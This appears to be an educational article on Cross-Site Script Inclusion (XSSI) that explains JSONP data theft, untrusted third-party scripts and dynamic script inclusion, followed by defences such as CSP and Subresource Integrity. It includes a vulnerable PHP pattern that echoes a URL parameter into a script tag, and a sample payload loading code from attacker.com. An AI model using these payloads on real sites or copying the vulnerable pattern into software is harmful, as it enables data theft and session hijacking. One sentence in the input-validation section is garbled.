# Cross-Site Script Inclusion (XSSI) Attack
Cross-Site Script Inclusion (XSSI) is a web security vulnerability that occurs when
an attacker is able to include or load a script from another domain and leverage it
to perform malicious actions. Unlike Cross-Site Scripting (XSS), which directly injects
and executes malicious scripts within a vulnerable site, XSSI relies on exploiting how
scripts are loaded and interpreted by the browsers, often taking advantage of the lack
of proper controls on script inclusion.

## How it works
XSSI typically involves tricking a vulnerable website or web applications into including
or referencing a script from an external, potentially malicious, source. The script may
contain sensitive information (like JSON data) that an attacker can steal or manipulate.
This attack usually exploits the fact that browsers do not enforce strict Same-Origin
Policy (SOP) on scripts loaded via `<script>` tags, allowing cross-origin requests.

## Typical XSSI Attack Scenarios

### Exploiting JSONP Endpoints
JSONP (JSON with Padding) is a technique used to bypass the Same-Origin Policy by
allowing the server to return JSON data wrapped in a function call. This method can
be exploited in an XSSI attack.

Example:
```HTML
<script src="https://example.com/api/data?callback=stealData"></script>
<script>
    function stealData(data) {
        console.log(data); // The attacker can now see the sensitive data.
    }
</script>
```

Vulnerability: If `https://example.com/api/data` returns sensitive data in JSONP
format, an attacker can steal the data by defining their own `stealData` function

Impact: Sensitive user data from the `example.com` site is exposed to the attacker.

### Including Third-Party Scripts
A web application includes scripts from third-party domains without proper validation
or integrity checks. If the third-party script is compromised or replaced with a malicious
one, the attacker can execute arbitrary code within the context of the vulnerable site.

Example:
```HTML
<script src="https://example.com/malicious.js"></script>
```

Vulnerability: The script from `example.com` could be malicious, containing code to
steal cookies, inject content, or perform unauthorized actions.

Impact: If `malicious.js` contains harmful code, it will execute within the user's
browser, potentially leading to data theft, session hijacking, or other attacks.

### Abusing Dynamic Script Inclusion
A web application dynamically includes scripts based on user input or URL parameters
without proper sanitization or validation.

Example:
```HTML
<script src="/scripts/<?php echo $_GET['script']; ?>.js"></script>
```

Vulnerability: An attacker could manipulate the `script` parameter to include a
malicious script...
```HTML
<script src="/scripts/https://attacker.com/evil.js"></script>
```

## Risk and Impacts of XSSI

### Data Exfiltration
XSSI can be used to steal sensitive data such as user information, session tokens,
or API keys from the targeted site.

### Cross-Origin Data Theft
By exploiting the lack of Same-Origin Policy enforcement on scripts, attackers
can steal data from other domains that are included via script tags.

### Session Hijacking
Malicious scripts included through XSSI can steal session cookies leading to session
hijacking and unauthorized access.

## Preventative Measures

### Use Content Security Policy (CSP)
Implement a strict CSP that restricts the domains from which scripts can be loaded.
This can prevent unauthorized script inclusion.

Example CSP Header:
```
Content-Security-Policy: script-src 'self' https://trusted-cdn.com;
```

### Avoid JSONP
Avoid using JSONP whenever possible. Instead, use CORS(Cross-Origin Resource Sharing)
with proper access controls to securely share resources across origins.

### Validate and Sanitize Input
Ensure that any input used to determine script inclusion (e.g. dynamic script loading) is
properly validated and sanitized to prevent share resource across origins.

### Use Subresource Integrity (SRI)
When including third-party scripts, use Subresource Integrity(SRI) to ensure that the
script has not been tampered with. SRI allows you to specify a cryptographic hash of the
script content, which the browser will check before executing it.

Example:
```HTML
<script src="https://trusted-cdn.com/library.js" integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxmR4LZZ4zE4rPb1jRIBP5yfoe8U3XU" crossorigin="anonymous"></script>
```

### Avoid Including Untrusted Scripts
Limit the use of external scripts to those from trusted sources. Avoid dynamically
including scripts based on user input or untrusted parameters.

### Same-Origin Data Policies
Ensure that sensitive data is protected by the Same-Origin Policy. For example,
avoid serving sensitive data via scripts that can be easily included on other domains.

### Use Secure API Endpoints
Protect API endpoints that return sensitive data with proper authentication,
authorization, and CSRF protections to prevent unauthorized access through script
inclusion.

## Conclusion
Cross-Site Script Inclusion (XSSI) is a serious web security vulnerability that can
lead to data theft, malicious code execution, and other attacks. By understanding how
XSSI works and implementing robust security measures, developers can protect their
web applications from these threats. Strong content policies, avoiding JSONP, validating
inputs, and using Subresource Integrity are essential steps in defending against
XSSI attacks.
